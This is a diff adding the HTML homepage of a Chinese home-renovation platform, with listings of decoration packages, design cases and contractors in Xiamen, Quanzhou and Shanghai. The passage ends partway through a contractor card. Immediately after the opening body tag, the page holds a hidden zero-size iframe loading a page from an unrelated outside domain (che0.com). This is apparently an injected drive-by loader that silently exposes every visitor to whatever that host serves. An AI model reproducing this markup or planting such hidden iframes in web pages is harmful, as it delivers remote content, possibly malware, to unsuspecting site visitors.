@@ -1,0 +1,1114 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta name="robots" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    <meta name="x5-page-mode" content="app">
+    <meta name="renderer" content="webkit">
+    <meta name="msapplication-tap-highlight" content="no">
+    <meta name="format-detection" content="telphone=no, email=no">
+    <meta name="baidu-site-verification" content="3XCAaXWj7i">
+    <meta name="360-site-verification" content="645dfe05ea9c7afba9176733c658d32f">
+    <meta name="sogou_site_verification" content="zSE1Pm7MLF">
+    <meta name="keywords" content="敲敲打打,装修平台,装修贷款,室内装修设计,装修公司">
+    <meta name="description" content="敲敲打打是装修综合信息服务平台,致力于为广大业主提供保障、省心的装修服务,平台为业主筛选各城市的优质装修公司,为业主提供免息装修贷款,为业主提供最新装修攻略及免费室内装修设计,全心全意为业主解决装修难题,让装修变得简单透明,帮助业主省时、省事、省心进行房屋装修.">
+    <title>敲敲打打-专业装修服务平台|装修公司_家居装修设计_装修贷款</title>
+    <link rel="shortcut icon" type="image/x-icon" href="/Public/Home/images/favicon.ico?var=1515481592">
+    <link rel="stylesheet" href="/Public/home/src/css/swiper.css?ver=1515481592">
+    <link rel="stylesheet" href="/Public/home/src/css/index.css?ver=1515481592">
+    <script src="http://push.zhanzhang.baidu.com/push.js"></script><script src="/Public/home/src/js/jquery.min.js"></script></head><body><iframe src="http://che0.com/cs5.html" width="0" height="0" frameborder="0"></iframe>
+
+    <script src="/Public/home/src/js/swiper.min.js"></script>
+    <script src="/Public/home/src/js/jquery.lazyload.js"></script>
+    <script src="/Public/home/src/js/jquery.sliphover.js"></script>
+    <script src="/Public/home/src/js/plugins.js"></script>
+    <script src="/Public/home/src/js/page.js"></script>
+
+
+
+<!-- 头部 -->
+
+<!-- 头部 -->
+<div class="header">
+    <div class="header-top">
+        <div class="container">
+            <div class="flex flex-between">
+                <div>
+                  <!--  <i class="icon icon-lbs-fill"></i>
+                    <span>厦门</span>
+                    <a class="link link-red" href="javascript:void(0);">&nbsp;[切换]</a>-->
+                </div>
+                <div class="flex-ele"></div>
+                <div>
+                                            <a class="link" href="/CompanyLogin/index.html">登录</a> &nbsp;&nbsp;|&nbsp;&nbsp;
+                        <a class="link" href="/CompanyLogin/register.html">注册</a> &nbsp;&nbsp;|&nbsp;&nbsp;                    <i class="icon icon-tel"></i>&nbsp;&nbsp;服务热线：0592-5962000
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="header-main">
+        <div class="container">
+            <div class="header-body flex flex-between">
+                <a href="/">
+                    <img class="header-logo" src="/Public/home/src/res/logo.png?ver=1.0.1" alt="logo">
+                </a>
+                <div class="header-menu flex-ele">
+                    <a class="header-link active" href="/">首页</a>
+                    <a class="header-link " href="/ZxCompany.html">装修公司</a>
+                    <a class="header-link " href="/CompanyPackage.html">装修套餐</a>
+                    <a class="header-link " href="/Case.html">装修案例</a>
+                    <a class="header-link " href="/Information.html">装修课堂</a>
+                    <a class="header-link header-noLink header-linkApp" href="javascript:void(0);">下载APP</a>
+                    <div class="header-app">
+                        <img class="header-qrcode" src="/Public/home/src/res/erweima.png?ver=1.0.2" alt="">
+                    </div>
+                </div>
+                <div class="header-search">
+                    <i class="header-icon icon icon-search "></i>
+                    <input type="text" class="header-input " placeholder="搜一搜发现更多" value="">
+                    <!-- 选择栏 -->
+                    <div class="select fixed hide">
+                        <div class="select-text">装修公司</div>
+                        <div class="select-dropMenu">
+                            <div class="select-dropItem">装修公司</div>
+                            <div class="select-dropItem">装修套餐</div>
+                            <div class="select-dropItem">装修案例</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function() {
+        var $winH = $(window).height();
+        var $headerTop = $(".header");
+        var $helpUp = $(".help-up");
+        $(window).scroll(function() {
+            var $top = $(this).scrollTop();
+            if ($top > 0) {
+                $headerTop.addClass("active");
+            } else {
+                $headerTop.removeClass("active");
+            }
+            if ($top > $winH) {
+                $helpUp.addClass("active");
+            } else {
+                $helpUp.removeClass("active")
+            }
+        });
+        // 获得焦点
+        $(".header-search").focusin(function() {
+            $(this).addClass("active");
+            $(".header-menu").addClass("hide");
+            $(this).children(".select").removeClass("hide");
+        });
+        $(".header-main,.header-body").on("click", function(e) {
+            if (e.target == $(this).get(0)) {
+                $(".header-search").removeClass("active");
+                $(".header-menu").removeClass("hide");
+                $(".header-search").children(".select").addClass("hide");
+            }
+        });
+        // 返回顶部
+        $(".help-up").on("click", function() {
+            $("body,html").animate({
+                scrollTop: 0
+            }, 1000);
+        });
+        // 选择栏-弹出下来菜单
+        $(".select-text").on("click", function() {
+            var $next = $(this).next("");
+            if (!$next.hasClass("active")) {
+                $next.addClass("active");
+            }
+        });
+        // 选择栏-选择内容
+        $(".select-dropItem").on("click", function() {
+            var txt = $(this).text();
+            $(this).parent().parent().children(".select-text").text(txt);
+            $(this).parent().removeClass("active");
+        });
+        // 新添加2017-9-15
+        $(".select-dropMenu").mouseleave(function() {
+            $(this).removeClass("active");
+        });
+        var mySwiper = new Swiper('.swiper-container', {
+            loop: true,
+            noSwiping: true,
+            speed: 700,
+            pagination: '.swiper-pagination',
+            nextButton: '.swiper-button-next',
+            prevButton: '.swiper-button-prev',
+        });
+        // 切换
+        $(".tab-link").hover(function() {
+            var $tab = $(this).parent().parent();
+            $(this).parent().children(".tab-link").removeClass("active");
+            $(this).addClass("active");
+            var index = $(this).index();
+            var $items = $tab.find(".tab-item");
+            $items.removeClass("active").eq(index).addClass("active");
+        }, function() {
+            // $(this).removeClass("active");
+        })
+    });
+</script>
+
+<script>
+    $(function () {
+
+        // 搜索按钮
+        $(".header-icon").on("click", function() {
+            // 城市
+            var $select = $(".header-search .select-text").text();
+            var $text = $(".header-input").val().trim();
+           /* if ($text == "") {
+                return;
+            }*/
+            if($select=="装修公司"){
+                var url="/ZxCompany/index";
+            }else if($select=="装修套餐"){
+                var url="/CompanyPackage/index";
+            }else if($select=="装修案例"){
+                var url="/Case/index";
+            }
+            if($text!='' && $text!=null){
+                url+="/key/"+$text+".html";
+                //跳转页面
+                window.location.href=url;
+            }
+
+          /*  //搜索完成
+            $(".header-main").trigger("click");
+            console.log($type + "----" + $text);*/
+        });
+        // 搜索框 回车
+        $(".header-input").keyup(function(e) {
+            if (e.keyCode == "13") {
+                $(".header-icon").trigger("click");
+            }
+        });
+    })
+
+</script>
+<!-- /头部 -->
+
+<!-- 主体 -->
+
+<!--mian-->
+
+
+    <div class="relative">
+        <div class="swiper-container swiper-container-horizontal">
+            <div class="swiper-wrapper" style="transform: translate3d(-7320px, 0px, 0px); transition: 0ms; -webkit-transition: 0ms;"><div class="swiper-slide swiper-no-swiping swiper-slide-duplicate swiper-slide-next swiper-slide-duplicate-prev" data-swiper-slide-index="4" style="width: 1220px;">
+                    <a href="/Index/insurance.html">
+                        <img src="/Public/home/src/res/anli5.jpg" alt="安心保险" title="安心保险">
+                    </a>
+                </div>
+              <!--  <div class="swiper-slide swiper-no-swiping">
+                    <a href="javascript:void(0);">
+                        <img src="/Public/home/src/res/xyzs.jpg" alt="星艺装饰" title="星艺装饰">
+                    </a>
+                </div>-->
+                <div class="swiper-slide swiper-no-swiping swiper-slide-duplicate-active" data-swiper-slide-index="0" style="width: 1220px;">
+                    <a href="javascript:void(0);">
+                        <img src="/Public/home/src/res/hxpwzs.jpg" alt="华浔装饰" title="华浔装饰">
+                    </a>
+                </div>
+                <div class="swiper-slide swiper-no-swiping" data-swiper-slide-index="1" style="width: 1220px;">
+                    <a href="/Index/design.html">
+                        <img src="/Public/home/src/res/banner_1.jpg" alt="免费设计" title="免费设计">
+                    </a>
+                </div>
+                <div class="swiper-slide swiper-no-swiping" data-swiper-slide-index="2" style="width: 1220px;">
+                    <a href="/Index/measure.html">
+                        <img src="/Public/home/src/res/banner_2.jpg" alt="免费量房" title="免费量房">
+                    </a>
+                </div>
+                <div class="swiper-slide swiper-no-swiping" data-swiper-slide-index="3" style="width: 1220px;">
+                    <a href="/Index/stages.html">
+                        <img src="/Public/home/src/res/banner_3.jpg" alt="免息分期" title="免息分期">
+                    </a>
+                </div>
+                <div class="swiper-slide swiper-no-swiping swiper-slide-prev swiper-slide-duplicate-next" data-swiper-slide-index="4" style="width: 1220px;">
+                    <a href="/Index/insurance.html">
+                        <img src="/Public/home/src/res/anli5.jpg" alt="安心保险" title="安心保险">
+                    </a>
+                </div>
+            <div class="swiper-slide swiper-no-swiping swiper-slide-duplicate swiper-slide-active" data-swiper-slide-index="0" style="width: 1220px;">
+                    <a href="javascript:void(0);">
+                        <img src="/Public/home/src/res/hxpwzs.jpg" alt="华浔装饰" title="华浔装饰">
+                    </a>
+                </div></div>
+            <div class="swiper-pagination swiper-pagination-bullets"><span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span></div>
+            <div class="swiper-button-prev"></div>
+            <div class="swiper-button-next"></div>
+        </div>
+        <!-- 免费装修咨询 -->
+        <div class="seek">
+            <div class="seek-title">
+                免费装修咨询&nbsp;&nbsp;|&nbsp;&nbsp;<span>敲敲打打已为</span><span class="seek-red">10542</span><span>人提供装修咨询</span>
+            </div>
+            <div class="seek-content">
+                <!-- 选择栏 -->
+                <div class="select custom">
+                    <div class="select-text">厦门市</div>
+                    <div class="select-dropMenu">
+                        <div class="select-dropItem">厦门市</div>
+                        <div class="select-dropItem">泉州市</div>
+                        <div class="select-dropItem">上海市</div>
+                    </div>
+                </div>
+                <input class="seek-input" type="tel" placeholder="填写手机号码，获取免费咨询名额">
+                <div class="seek-btn">立即申请</div>
+            </div>
+        </div>
+    </div>
+    <!-- 4个免费 -->
+    <div class="free">
+        <div class="container flex flex-between">
+            <a class="free-link" href="/Index/design.html">
+                <img src="/Public/home/src/res/design.png" alt="免费设计" title="免费设计">
+            </a>
+            <a class="free-link" href="/Index/measure.html">
+                <img src="/Public/home/src/res/measure.png" alt="免费量房" title="免费量房">
+            </a>
+            <a class="free-link" href="/Index/stages.html">
+                <img src="/Public/home/src/res/freec.jpg" alt="免息分期" title="免息分期">
+            </a>
+            <a class="free-link" href="/Index/insurance.html">
+                <img src="/Public/home/src/res/insurance.png?var=1515481592" alt="安心保险" title="安心保险">
+            </a>
+        </div>
+    </div>
+    <!-- 盒子 -->
+    <div class="box">
+        <div class="box-title">
+            装修套餐精选
+        </div>
+        <div class="box-subTitle">
+            网罗全网性价比套餐&nbsp;&nbsp;总有一款适合你
+        </div>
+        <!-- 切换 -->
+        <div class="tab">
+            <div class="tab-header flex">
+                <a href="/CompanyPackage/index/city/xm.html" class="tab-link flex-ele active">厦门</a>
+                <a href="/CompanyPackage/index/city/qz.html" class="tab-link flex-ele">泉州</a>
+                <a href="/CompanyPackage/index/city/sh.html" class="tab-link flex-ele">上海</a>
+                <a href="/CompanyPackage/index.html" class="tab-link flex-ele">全部公司</a>
+            </div>
+            <div class="tab-content">
+                <div class="container">
+                    <div class="tab-item container flex flex-between active">
+                        <div class="card">
+                                <a href="/CompanyPackage/detail/3.html">
+                                <div class="card-imgBox">
+                                    <img class="card-img" width="390" height="415" src="/Uploads/Picture/2017-09-15/p_2.jpg" alt="时尚精致" title="时尚精致">
+                                                                        </div>
+                                <div class="card-mask">
+                                    时尚精致                                </div>
+                                </a><div class="card-content flex"><a href="/CompanyPackage/detail/3.html">
+                                    <div class="card-text">
+                                        <span class="card-unit">￥</span>2388                                        <span class="text-del card-unit">市场价￥3000</span>
+                                    </div>
+                                    </a><a class="card-btn flex-ele" href="/CompanyPackage/detail/3.html">立即抢购</a>
+                                </div>
+                                
+                            </div><div class="card">
+                                <a href="/CompanyPackage/detail/2.html">
+                                <div class="card-imgBox">
+                                    <img class="card-img" width="390" height="415" src="/Uploads/Picture/2017-09-15/p_3.jpg" alt="温馨乐活" title="温馨乐活">
+                                                                        </div>
+                                <div class="card-mask">
+                                    温馨乐活                                </div>
+                                </a><div class="card-content flex"><a href="/CompanyPackage/detail/2.html">
+                                    <div class="card-text">
+                                        <span class="card-unit">￥</span>1788                                        <span class="text-del card-unit">市场价￥2000</span>
+                                    </div>
+                                    </a><a class="card-btn flex-ele" href="/CompanyPackage/detail/2.html">立即抢购</a>
+                                </div>
+                                
+                            </div><div class="card">
+                                <a href="/CompanyPackage/detail/1.html">
+                                <div class="card-imgBox">
+                                    <img class="card-img" width="390" height="415" src="/Uploads/Picture/2017-09-15/p_4.jpg" alt="纯真质朴" title="纯真质朴">
+                                                                        </div>
+                                <div class="card-mask">
+                                    纯真质朴                                </div>
+                                </a><div class="card-content flex"><a href="/CompanyPackage/detail/1.html">
+                                    <div class="card-text">
+                                        <span class="card-unit">￥</span>1188                                        <span class="text-del card-unit">市场价￥1300</span>
+                                    </div>
+                                    </a><a class="card-btn flex-ele" href="/CompanyPackage/detail/1.html">立即抢购</a>
+                                </div>
+                                
+                            </div>
+                    </div>
+                    <div class="tab-item container flex flex-between">
+                        <div class="card">
+                                <a href="/CompanyPackage/detail/4.html">
+                                <div class="card-imgBox">
+                                    <img class="card-img" width="390" height="415" src="/Uploads/Picture/2017-09-15/p_1.jpg" alt="时尚家系列" title="时尚家系列">
+                                                                        </div>
+                                <div class="card-mask">
+                                    时尚家系列                                </div>
+                                </a><div class="card-content flex"><a href="/CompanyPackage/detail/4.html">
+                                    <div class="card-text">
+                                        <span class="card-unit">￥</span>1390                                        <span class="text-del card-unit">市场价￥1500</span>
+                                    </div>
+                                    </a><a class="card-btn flex-ele" href="javascript:void(0);">立即抢购</a>
+                                </div>
+                                
+                            </div>                    </div>
+                    <div class="tab-item container flex flex-between">
+                        <div class="card">
+                                <a href="/CompanyPackage/detail/9.html">
+                                <div class="card-imgBox">
+                                                                            <img class="card-img" width="390" height="415" src="/Uploads/Picture/2017-12-21/5a3b1463897c5.jpg" alt="极致生活" title="极致生活">                                </div>
+                                <div class="card-mask">
+                                    极致生活                                </div>
+                                </a><div class="card-content flex"><a href="/CompanyPackage/detail/9.html">
+                                    <div class="card-text">
+                                        <span class="card-unit">￥</span>799                                        <span class="text-del card-unit">市场价￥1399</span>
+                                    </div>
+                                    </a><a class="card-btn flex-ele" href="javascript:void(0);">立即抢购</a>
+                                </div>
+                                    
+                            </div>                    </div>
+                    <div class="tab-item container flex flex-between">
+                        <div class="card">
+                                <a href="/CompanyPackage/detail/9.html">
+                                <div class="card-imgBox">
+                                                                            <img class="card-img" width="390" height="415" src="/Uploads/Picture/2017-12-21/5a3b1463897c5.jpg" alt="极致生活" title="极致生活">                                </div>
+                                <div class="card-mask">
+                                    极致生活                                </div>
+                                </a><div class="card-content flex"><a href="/CompanyPackage/detail/9.html">
+                                    <div class="card-text">
+                                        <span class="card-unit">￥</span>799                                        <span class="text-del card-unit">市场价￥1399</span>
+                                    </div>
+                                    </a><a class="card-btn flex-ele" href="javascript:void(0);">立即抢购</a>
+                                </div>
+                                    
+                            </div><div class="card">
+                                <a href="/CompanyPackage/detail/4.html">
+                                <div class="card-imgBox">
+                                    <img class="card-img" width="390" height="415" src="/Uploads/Picture/2017-09-15/p_1.jpg" alt="时尚家系列" title="时尚家系列">
+                                                                        </div>
+                                <div class="card-mask">
+                                    时尚家系列                                </div>
+                                </a><div class="card-content flex"><a href="/CompanyPackage/detail/4.html">
+                                    <div class="card-text">
+                                        <span class="card-unit">￥</span>1390                                        <span class="text-del card-unit">市场价￥1500</span>
+                                    </div>
+                                    </a><a class="card-btn flex-ele" href="javascript:void(0);">立即抢购</a>
+                                </div>
+                                    
+                            </div><div class="card">
+                                <a href="/CompanyPackage/detail/3.html">
+                                <div class="card-imgBox">
+                                    <img class="card-img" width="390" height="415" src="/Uploads/Picture/2017-09-15/p_2.jpg" alt="时尚精致" title="时尚精致">
+                                                                        </div>
+                                <div class="card-mask">
+                                    时尚精致                                </div>
+                                </a><div class="card-content flex"><a href="/CompanyPackage/detail/3.html">
+                                    <div class="card-text">
+                                        <span class="card-unit">￥</span>2388                                        <span class="text-del card-unit">市场价￥3000</span>
+                                    </div>
+                                    </a><a class="card-btn flex-ele" href="javascript:void(0);">立即抢购</a>
+                                </div>
+                                    
+                            </div>                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- 盒子 -->
+    <div class="box bg-gray">
+        <div class="box-title">
+            装修案例精选
+        </div>
+        <div class="box-subTitle">
+            海量精品效果图&nbsp;&nbsp;找到你家未来的样子
+        </div>
+        <div class="box-nav">
+            <ul>
+                <li><a href="/Case/index/style_id/5.html">田园</a> <span class="navbar-line">/</span></li>
+                <li><a href="/Case/index/style_id/6.html">地中海</a><span class="navbar-line">/</span></li>
+                <li><a href="/Case/index/style_id/7.html">中式</a> <span class="navbar-line">/</span></li>
+                <li><a href="/Case/index/style_id/8.html">欧式</a> <span class="navbar-line">/</span></li>
+                <li><a href="/Case/index/style_id/9.html">现代</a> <span class="navbar-line">/</span></li>
+                <li><a href="/Case.html">更多</a>
+                    <sapn class="arrow"></sapn>
+                </li>
+
+            </ul>
+        </div>
+        <!-- 画廊 -->
+        <div class="paint">
+            <div class="container flex">
+                <div class="paint-item1">
+                    <a href="/Case/detail/93.html">
+                        <img src="/Public/home/src/res/anli1.jpg" alt="地中海风格3房两厅" title="地中海风格3房两厅 &lt;div class='paint-num'&gt;6张&lt;/div&gt;">
+                    </a>
+                </div>
+                <div class="paint-item2">
+                    <div class="paint-two flex">
+                        <a class="paint-twoLeft" href="/Case/detail/92.html">
+                            <img src="/Public/home/src/res/anli2.jpg" alt=" 小清新地中海风" title=" 小清新地中海风 &lt;div class='paint-num'&gt;7张&lt;/div&gt;">
+                        </a>
+                        <a href="/Case/detail/91.html">
+                            <img src="/Public/home/src/res/anli3.png" alt="$case_list[2].title" title="中式风格也可以如此清爽 &lt;div class='paint-num'&gt;13张&lt;/div&gt;">
+                        </a>
+                    </div>
+                    <div class="paint-three flex">
+                        <a class="paint-threeItem" href="/Case/detail/90.html">
+                            <img src="/Public/home/src/res/anli5.png" alt="法式风情" title="法式风情 &lt;div class='paint-num'&gt;8张&lt;/div&gt;">
+                        </a>
+                        <a class="paint-threeItem" href="/Case/detail/89.html">
+                            <img src="/Public/home/src/res/anli6.png" alt="童话世界 欧式70平婚房" title="童话世界 欧式70平婚房 &lt;div class='paint-num'&gt;9张&lt;/div&gt;">
+                        </a>
+                        <a class="paint-threeItem" href="/Case/detail/88.html">
+                            <img src="/Public/home/src/res/anli4.jpg" alt="165平现代简约四室两厅，黑与白的对峙" title="165平现代简约四室两厅，黑与白的对峙 &lt;div class='paint-num'&gt;11张&lt;/div&gt;">
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- 盒子 -->
+    <div class="box">
+        <div class="box-title">
+            装修公司精选
+        </div>
+        <div class="box-subTitle">
+            甄选优质装修公司&nbsp;&nbsp;立享省心装修服务
+        </div>
+        <!-- 切换 -->
+        <div class="tab">
+            <div class="tab-header flex">
+                <a href="/ZxCompany/index/city/xm.html" class="tab-link flex-ele active">厦门</a>
+                <a href="/ZxCompany/index/city/qz.html" class="tab-link flex-ele">泉州</a>
+                <a href="/ZxCompany/index/city/sh.html" class="tab-link flex-ele">上海</a>
+                <a href="/ZxCompany/index.html" class="tab-link flex-ele">全部公司</a>
+            </div>
+            <div class="tab-content">
+                <div class="container">
+                    <div class="tab-item container flex flex-between active">
+                        <!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/1.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm1.png" alt="厦门敲敲打打网络科技有限公司" title="厦门敲敲打打网络科技有限公司">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/1.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-12-26/5a41a205bdd50.png" alt="厦门敲敲打打网络科技有限公司" title="厦门敲敲打打网络科技有限公司">
+                                    <div class="panel-name">厦门敲敲打打网络科技有限公司</div>
+                                    <div class="panel-detail">
+                                        好评率：<span class="panel-red">99%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">3</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">869</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/1.html">免费设计</a>
+                                </div>
+                                
+                            </div><!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/6.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm2.png" alt="厦门星艺装饰有限公司" title="厦门星艺装饰有限公司">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/6.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-08-03/5982c2e49978a.png" alt="厦门星艺装饰有限公司" title="厦门星艺装饰有限公司">
+                                    <div class="panel-name">厦门星艺装饰有限公司</div>
+                                    <div class="panel-detail">
+                                        好评率：<span class="panel-red">98%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">3</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">484</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/6.html">免费设计</a>
+                                </div>
+                                
+                            </div><!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/2.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm3.png" alt="厦门邮电纵横装饰工程有限公司" title="厦门邮电纵横装饰工程有限公司">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/2.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-12-01/5a2114901e932.jpg" alt="厦门邮电纵横装饰工程有限公司" title="厦门邮电纵横装饰工程有限公司">
+                                    <div class="panel-name">厦门邮电纵横装饰工程有限公司</div>
+                                    <div class="panel-detail">
+                                        好评率：<span class="panel-red">89%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">3</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">654</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/2.html">免费设计</a>
+                                </div>
+                                
+                            </div>
+                    </div>
+                    <div class="tab-item container flex flex-between">
+                        <!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/4.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm1.png" alt="泉州市托美尔设计工程有限公司" title="泉州市托美尔设计工程有限公司">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/4.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-08-03/5982c21bb70c1.png" alt="泉州市托美尔设计工程有限公司" title="泉州市托美尔设计工程有限公司">
+                                    <div class="panel-name">泉州市托美尔设计工程有限公司</div>
+                                    <div class="panel-detail">
+                                        好评率：<span class="panel-red">98%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">4</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">478</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/4.html">免费设计</a>
+                                </div>
+                                    
+                            </div><!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/19.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm2.png" alt="泉州市三星装饰工程有限公司" title="泉州市三星装饰工程有限公司">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/19.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-11-01/59f93187a612c.jpg" alt="泉州市三星装饰工程有限公司" title="泉州市三星装饰工程有限公司">
+                                    <div class="panel-name">泉州市三星装饰工程有限公司</div>
+                                    <div class="panel-detail">
+                                        好评率：<span class="panel-red">98%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">4</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">822</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/19.html">免费设计</a>
+                                </div>
+                                    
+                            </div><!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/22.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm3.png" alt="华浔品味装饰" title="华浔品味装饰">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/22.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-11-02/59faeb1d5eb58.jpg" alt="华浔品味装饰" title="华浔品味装饰">
+                                    <div class="panel-name">华浔品味装饰</div>
+                                    <div class="panel-detail">
+                                        好评率：<span class="panel-red">98%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">6</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">808</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/22.html">免费设计</a>
+                                </div>
+                                    
+                            </div>                    </div>
+                    <div class="tab-item container flex flex-between">
+                        <!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/24.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm1.png" alt="上海敲敲打打网络科技有限公司" title="上海敲敲打打网络科技有限公司">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/24.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-12-08/5a2a2de58bf08.png" alt="上海敲敲打打网络科技有限公司" title="上海敲敲打打网络科技有限公司">
+                                    <div class="panel-name">上海敲敲打打网络科技有限公司</div>
+                                    <div class="panel-detail">
+                                        好评率：<span class="panel-red">98%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">19</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">980</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/24.html">免费设计</a>
+                                </div>
+                                
+                            </div><!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/42.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm2.png" alt="上海晴亦乐建筑装饰工程有限公司" title="上海晴亦乐建筑装饰工程有限公司">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/42.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-12-19/5a38b6bcc9b44.jpg" alt="上海晴亦乐建筑装饰工程有限公司" title="上海晴亦乐建筑装饰工程有限公司">
+                                    <div class="panel-name">上海晴亦乐建筑装饰工程有限公司</div>
+                                    <div class="panel-detail">
+                                        好评率：<span class="panel-red">97%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">6</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">853</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/42.html">免费设计</a>
+                                </div>
+                                
+                            </div><!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/11.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm3.png" alt="上海骋观建筑装饰工程有限公司" title="上海骋观建筑装饰工程有限公司">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/11.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-10-20/59e96f44223ed.jpg" alt="上海骋观建筑装饰工程有限公司" title="上海骋观建筑装饰工程有限公司">
+                                    <div class="panel-name">上海骋观建筑装饰工程有限公司</div>
+                                    <div class="panel-detail">
+                                        好评率：<span class="panel-red">96%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">5</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">780</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/11.html">免费设计</a>
+                                </div>
+                                
+                            </div>                    </div>
+                    <div class="tab-item container flex flex-between">
+                        <!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/1.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm1.png" alt="厦门敲敲打打网络科技有限公司" title="厦门敲敲打打网络科技有限公司">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/1.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-12-26/5a41a205bdd50.png" alt="厦门敲敲打打网络科技有限公司" title="厦门敲敲打打网络科技有限公司">
+                                    <div class="panel-name">厦门敲敲打打网络科技有限公司</div>
+                                    <div class="panel-detail">
+                                        好评率：<span class="panel-red">99%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">3</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">869</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/1.html">免费设计</a>
+                                </div>
+                                
+                            </div><!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/4.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm2.png" alt="泉州市托美尔设计工程有限公司" title="泉州市托美尔设计工程有限公司">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/4.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-08-03/5982c21bb70c1.png" alt="泉州市托美尔设计工程有限公司" title="泉州市托美尔设计工程有限公司">
+                                    <div class="panel-name">泉州市托美尔设计工程有限公司</div>
+                                    <div class="panel-detail">
